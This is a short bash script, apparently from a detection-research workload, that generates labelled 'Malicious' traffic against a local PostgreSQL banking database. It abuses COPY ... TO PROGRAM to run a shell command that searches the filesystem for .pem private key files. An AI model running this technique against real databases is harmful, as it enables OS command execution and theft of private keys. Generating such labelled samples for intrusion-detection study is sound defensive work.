#!/usr/bin/env bash
# 4D OOD workload -- adapted from ../attack_workload/attack_priv_var_find_keys.sh (legacy: casce_tpcb, -U postgres).
# Only connection and label changed; the OS command itself is unchanged.
set -u
REPEAT=${REPEAT:-1}
PSQL="psql -X -q -h 127.0.0.1 -d casce_banking"

echo "4D: OS command execution (find private keys), repeat ${REPEAT}..."
PGAPPNAME="casce_label=Malicious:os_find_keys_r${REPEAT}" \
  $PSQL -U teller -c "COPY (SELECT 1) TO PROGRAM 'find / -name '*.pem' > /tmp/out_find_keys.txt 2>/dev/null || true';"
